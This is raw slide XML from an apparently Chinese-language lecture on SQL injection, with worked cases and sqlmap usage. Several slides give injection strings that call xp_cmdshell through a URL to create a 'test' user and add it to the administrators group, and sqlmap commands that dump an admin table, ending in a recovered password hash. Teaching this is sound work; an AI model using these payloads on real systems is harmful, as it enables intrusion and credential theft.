            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>注入：案例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="图像 1副本"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1185862" y="2281237"/>
            <a:ext cx="5919788" cy="3471863"/>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20813"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>链接中加入</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>”and 1 =1”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>后的返回结果</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>注入：案例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="图像 3副本"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1276351" y="2386011"/>
            <a:ext cx="6419850" cy="3167063"/>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382713"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>判断注入权限是否是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1"/>
              <a:t>sysadmin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>注入语句为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>and 1=(select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1"/>
              <a:t>is_srvrolemember</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1"/>
              <a:t>sysadmin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>'))</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>注入：案例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="图像 5"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="895350" y="2976562"/>
            <a:ext cx="6886575" cy="2833688"/>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3088" y="1268413"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>下面的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>中包含的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>语句用来增加一个名为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>test</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>用户（口令也为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>test</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>）。返回结果如图</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>10-6</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>所示。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>http://26.28.249.154/asd/wyqy/shownews.asp?id=51;exec master..</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>xp_cmdshell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t> 'net user test </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>test</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t> /add'--</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>注入：案例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="图像 6"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1028700" y="3386137"/>
            <a:ext cx="6838950" cy="2652713"/>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7388" y="1411288"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>下面，将增加的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>test</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>用户加入到管理员组。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>链接为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>http://26.28.249.154/asd/wyqy/shownews.asp?id=51;exec master..</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>xp_cmdshell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t> 'net </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>localgroup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t> administrators test /add'--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>，返回结果如图</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>10-7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>所示。从图中可以看出，页面正常返回，说明添加成功。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>注入：案例</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="图像 7"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1300162" y="3733799"/>
            <a:ext cx="6967538" cy="2619375"/>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46345"/>
            <a:ext cx="8152678" cy="4915910"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>一般来说，只要是带有参数的动态网页且此网页访问了数据库，那么该页面就有可能存在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>注入漏洞。如果程序员安全意识不强，没有过滤输入的一些特殊字符，则存在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>注入的可能性就非常大。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>在探测过程中，需要分析服务器返回的详细错误信息。而在默认情况下，浏览器仅显示“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>HTTP 500</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>服务器错误”，并不显示详细的错误信息。为此，需要调整</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>IE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>浏览器的配置，即把</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>IE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>菜单【工具】中【</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>Internet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>选项】下的高级选项中的【显示友好</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>错误信息】前面的勾去掉。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>注入：检测</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54038" y="1354137"/>
            <a:ext cx="7772400" cy="4579937"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>在形如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>http://xxx.xxx.xxx/abc.asp?id=XX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>的带有参数的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>ASP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>动态网页中，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>XX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>为参数。参数的个数和类型取决于具体的应用。参数的类型可以是整型或者字符串型。下面我们以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>http://xxx.xxx.xxx/abc.asp?id=YY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>为例进行分析</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>、整型参数时的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>注入漏洞探测</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>、字符串型参数时的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>注入漏洞探测</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>、特殊情况的处理</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>注入：检测</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0"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1040765" y="2238057"/>
            <a:ext cx="7103110" cy="2295843"/>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188" y="1287463"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>检测注入点是否可用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> sqlmap.py -u http://10.0.0.22/nanfang/ProductShow.asp?ID=56</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>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1"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1726882" y="2833687"/>
            <a:ext cx="5271135" cy="3552825"/>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2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>列出数据库表</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>sqlmap.py -u "http://10.0.0.22/nanfang/ProductShow.asp?ID=56" –tables</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>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2"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1279207" y="3284537"/>
            <a:ext cx="6655118" cy="2554288"/>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3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>列出指定表中的字段</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>sqlmap.py -u "http://10.0.0.22/nanfang/ProductShow.asp?ID=56" -T admin –columns</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>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3"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1241107" y="3269932"/>
            <a:ext cx="6845618" cy="2292668"/>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1763"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>列出表记录</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>sqlmap.py -u "http://10.0.0.22/nanfang/ProductShow.asp?ID=56" -T admin -C "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>id,data,username,password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>" –dump</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>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4"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1057275" y="3678555"/>
            <a:ext cx="7229475" cy="1855470"/>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2"/>
            <a:ext cx="7772400" cy="4522787"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>验证结果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>从图</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>10-12</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>所示的结果可以发现其中的一个用户信息为：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>　　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>　　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>username: admin</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>　　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>password: 3acdbb255b45d296</a:t>
            </a:r>
